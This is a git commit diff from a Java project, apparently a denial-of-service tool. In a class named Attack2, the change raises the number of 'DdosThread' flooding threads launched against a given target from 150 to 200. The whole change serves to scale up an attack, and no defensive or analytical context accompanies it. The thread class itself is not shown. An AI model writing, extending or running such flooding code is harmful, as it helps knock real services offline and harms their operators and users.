395afcff274fbba8bc8ac6bb81e10fd58c47b837
Circle_java_ATB <Serdyk87@ukr.net>
2022-03-01 19:12:26 +0200

    fifty commit

--- src/main/java/qwestgroup/service/Attack2.java
+++ src/main/java/qwestgroup/service/Attack2.java
@@ -8,7 +8,7 @@ public class Attack2 {
 
     public void main1(String title) throws Exception {
         System.out.println(title);
-            for (int i = 0; i < 150; i++) {
+            for (int i = 0; i < 200; i++) {
                 DdosThread thread = new DdosThread(title);
                 thread.start();
             }
